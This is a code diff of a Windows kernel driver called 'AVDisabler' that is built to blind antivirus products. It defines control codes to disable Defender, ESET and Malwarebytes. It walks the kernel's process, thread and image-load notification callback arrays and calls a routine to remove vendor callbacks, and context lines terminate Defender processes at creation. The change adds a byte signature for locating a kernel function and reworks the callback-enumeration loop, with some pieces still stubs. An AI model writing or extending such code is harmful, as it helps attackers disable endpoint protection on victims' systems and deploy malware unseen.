@@ -6,9 +6,13 @@
 #define DeviceType 0x8001
 #define PROCESS_TERMINATE 1
 
+#define BYTE CHAR
+
 #define IOCTL_DISABLE_DEFENDER CTL_CODE(DeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)		
 #define IOCTL_DISABLE_ESET CTL_CODE(DeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)			
 #define IOCTL_DISABLE_MALWAREBYTES CTL_CODE(DeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)	
+
+BYTE PspEnumerateCallbackOpcodes[] = { 0x4C, 0x8B, 0xCA, 0x85, 0xC9, 0x74, 0x35, 0x83, 0xE9, 0x01}; // first 10 opcodes
 
 //TODO: Add an initial process termination functiona that will be called at the start of each process creation callback routine 
 //	on each UNICODE_STRING image related to the AV Vendor (Defender, ESET, Malwarebytes) etc...
@@ -131,6 +135,17 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
 		
 	}
+}
+
+VOID GetPspEnumerateCallbackBaseAddress(ULONG_PTR* PspEnumerateCallbackBaseAddress) 
+{
+	/*
+		Need here to implement a function that reads the whole content of ntoskrnl.exe into a memory buffer
+		Then, compare every 10 opcodes with the PspEnumerateCallback opcodes, whenever there is a match,
+		return the base address/offset from base address into PspEnumerateCallbackBaseAddress
+	*/
+
+	return;
 }
 
 NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
@@ -447,6 +462,7 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 	UNICODE_STRING TestFullPath = RTL_CONSTANT_STRING(L"C:\\Users\\user\\test.txt");
 	UNICODE_STRING a;
 	status = GetFileNameFromPath(TestFullPath, &a);
+
 	if (!NT_SUCCESS(status))
 	{
 		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
@@ -461,6 +477,7 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 		return status;
 	}
 	KdPrint(("[+] AVDisabler::DriverEntry: Device %wZ was created successfully!\n", &DeviceName));
+
 	status = IoCreateSymbolicLink(&DeviceSymlink, &DeviceName);
 	if (!NT_SUCCESS(status))
 	{
@@ -472,25 +489,24 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 	KdPrint(("[+] AVDisabler::DriverEntry: Device symlink %wZ was created successfully!\n", &DeviceSymlink));
 
 	status = TerminateAVCallbackRoutines(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);
-
-	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[0]: 0x%p\n", *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
-	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[0]: 0x%p\n", *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
-	KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[0]: 0x%p\n", *(ULONG_PTR**)PspLoadImageCallbackRoutine));
+	
+	ULONG_PTR PspCreateProcessCallbackRoutineBaseAddress = PspCreateProcessCallbackRoutine;
+	ULONG_PTR PspCreateThreadCallbackRoutineBaseAddress = PspCreateThreadCallbackRoutine;
+	ULONG_PTR PspLoadImageCallbackRoutineBaseAddress = PspLoadImageCallbackRoutine;
 
 	DWORD32 PspCreateThreadCallbackRoutineCount = 0;
 	DWORD32 PspCreateProcessCallbackRoutineCount = 0;
 	DWORD32 PspLoadImageCallbackRoutineCount = 0;
 
+	KdPrint(("\n"));
+
 	while (*(ULONG_PTR**)PspCreateProcessCallbackRoutine != (ULONG_PTR)0x0 ||
 		   *(ULONG_PTR**)PspCreateThreadCallbackRoutine != (ULONG_PTR)0x0 ||
 		   *(ULONG_PTR**)PspLoadImageCallbackRoutine != (ULONG_PTR)0x0)
 	{
-		/*
-		Need to add edge cases:
-			- where both loadimage and thread are 0
-			- where both loadimage and process are 0
-		*/
-		if (*(ULONG_PTR**)PspCreateProcessCallbackRoutine == (ULONG_PTR)0x0)
+		if (*(ULONG_PTR**)PspCreateProcessCallbackRoutine == (ULONG_PTR)0x0 &&
+			*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
+			*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
 		{
 			PspCreateThreadCallbackRoutine += 0x8;
 			PspLoadImageCallbackRoutine += 0x8;
@@ -498,11 +514,13 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 			PspCreateThreadCallbackRoutineCount++;
 			PspLoadImageCallbackRoutineCount++;
 
-			KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
-			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
 		}
 
-		if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == (ULONG_PTR)0x0)
+		else if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == (ULONG_PTR)0x0 &&
+				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0 &&
+				 *(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
 		{
 			PspCreateProcessCallbackRoutine += 0x8;
 			PspLoadImageCallbackRoutine += 0x8;
@@ -510,27 +528,52 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 			PspCreateProcessCallbackRoutineCount++;
 			PspLoadImageCallbackRoutineCount++;
 
-			KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
-			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
 
 		}
 
-		if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == (ULONG_PTR)0x0)
+		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == (ULONG_PTR)0x0 &&
+			     *(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
+				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0)
 		{
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
+
 			PspCreateProcessCallbackRoutine += 0x8;
 			PspCreateThreadCallbackRoutine += 0x8;
 
 			PspCreateProcessCallbackRoutineCount++;
 			PspCreateThreadCallbackRoutineCount++;
-
-			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
-			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
-
 		}
 
-		if(*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0 &&
-		   *(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
-		   *(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
+		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == 0x0 &&
+				 *(ULONG_PTR**)PspCreateThreadCallbackRoutine == 0x0 &&
+				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0)
+		{
+			PspCreateProcessCallbackRoutine += 0x8;
+			PspCreateProcessCallbackRoutineCount++;
+		}
+
+		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == 0x0 &&
+			     *(ULONG_PTR**)PspCreateProcessCallbackRoutine == 0x0 &&
+				 *(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0)
+		{
+			PspCreateThreadCallbackRoutine += 0x8;
+			PspCreateThreadCallbackRoutineCount++;
+		}
+
+		else if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == 0x0 &&
+				 *(ULONG_PTR**)PspCreateProcessCallbackRoutine == 0x0 &&
+				 *(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
+		{
+			PspLoadImageCallbackRoutine += 0x8;
+			PspLoadImageCallbackRoutineCount++;
+		}
+
+		else if(*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0 &&
+				*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
+				*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
 		{
 			PspCreateProcessCallbackRoutine += 0x8;
 			PspCreateThreadCallbackRoutine += 0x8;
@@ -540,40 +583,42 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 			PspCreateThreadCallbackRoutineCount++;
 			PspLoadImageCallbackRoutineCount++;
 
-			KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
-			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
-			KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", PspLoadImageCallbackRoutineCount, *(ULONG_PTR**)PspLoadImageCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", PspCreateProcessCallbackRoutineCount, *(ULONG_PTR**)PspCreateProcessCallbackRoutine));
+			//KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", PspCreateThreadCallbackRoutineCount, *(ULONG_PTR**)PspCreateThreadCallbackRoutine));
 		}
 	}
-
-	PspCreateProcessCallbackRoutineCount--;
-	PspCreateThreadCallbackRoutineCount--;
-	PspLoadImageCallbackRoutineCount--;
 
 	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutineCount: %d\n", PspCreateProcessCallbackRoutineCount));
 	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutineCount: %d\n", PspCreateThreadCallbackRoutineCount));
 	KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutineCount: %d\n", PspLoadImageCallbackRoutineCount));
 
-	status = TerminateAVCallbackRoutines(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);
+	KdPrint(("\n"));
 
 	for (int i = 0; i < PspCreateProcessCallbackRoutineCount; i++)
 	{
-		KdPrint(("[*] AVDisabler::DriverEntry After: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateProcessCallbackRoutine)));
-		PspCreateProcessCallbackRoutine += 0x8;
+		KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateProcessCallbackRoutineBaseAddress)));
+		PspCreateProcessCallbackRoutineBaseAddress += 0x8;
 	}
+
 	KdPrint(("\n"));
+
 	for (int i = 0; i < PspCreateThreadCallbackRoutineCount; i++)
 	{
-		KdPrint(("[*] AVDisabler::DriverEntry After: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateThreadCallbackRoutine)));
-		PspCreateThreadCallbackRoutine += 0x8;
+		KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateThreadCallbackRoutineBaseAddress)));
+		PspCreateThreadCallbackRoutineBaseAddress += 0x8;
 	}
+
 	KdPrint(("\n"));
+
 	for (int i = 0; i < PspLoadImageCallbackRoutineCount; i++)
 	{
-		KdPrint(("[*] AVDisabler::DriverEntry  After: PspLoadImageCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspLoadImageCallbackRoutine)));
-		PspLoadImageCallbackRoutine += 0x8;
+		KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspLoadImageCallbackRoutineBaseAddress)));
+		PspLoadImageCallbackRoutineBaseAddress += 0x8;
 	}	
+
 	KdPrint(("\n"));
+
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
 	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatchRoutine;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTLHandlerDispatchRoutine;
